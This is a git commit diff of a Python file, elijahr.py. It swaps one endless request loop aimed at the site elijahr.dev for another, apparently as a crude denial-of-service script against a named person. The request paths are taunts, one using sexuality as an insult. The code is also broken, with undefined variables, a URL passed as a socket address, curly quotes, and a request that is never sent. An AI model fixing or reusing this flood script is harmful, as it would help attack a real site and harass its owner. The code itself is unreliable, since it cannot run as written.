e09e601f937eb067d2676c092ad73d0db32e9899
phsoftware-corp <heckervirusads+free@gmail.com>
2025-03-02 17:52:20 +0100

    Update elijahr.py

--- elijahr.py
+++ elijahr.py
@@ -1,6 +1,6 @@
+import urllib.request
+import urllib
+import time
+import os
 while True:
- s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- s.connect(("https://elijahr.dev", "80"))
- s.sendto(("GET /GAMEOVER-DDOSED" + target + " HTTP/1.1\r\n").encode(’ascii’), (target, port))
- s.sendto(("Host: its-over.com" + "\r\n\r\n").encode(’ascii’), (target, port))
- s.close()
+ ddos = urllib.request.Request('http://elijahr.dev/imddosingmyselfandimgay')
